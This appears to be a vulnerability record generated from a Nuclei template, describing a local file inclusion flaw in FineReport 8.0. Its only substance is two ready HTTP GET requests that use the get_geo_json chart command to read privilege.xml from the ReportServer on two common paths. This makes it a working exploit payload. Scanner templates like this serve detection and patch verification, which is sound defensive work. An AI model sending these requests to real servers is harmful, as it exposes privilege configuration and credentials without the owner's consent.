# Vulnerability: FineReport 8.0 - Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`finereport-path-traversal.yaml`)

## Description
FIneReport  8.0 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
GET {{BaseURL}}/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
```

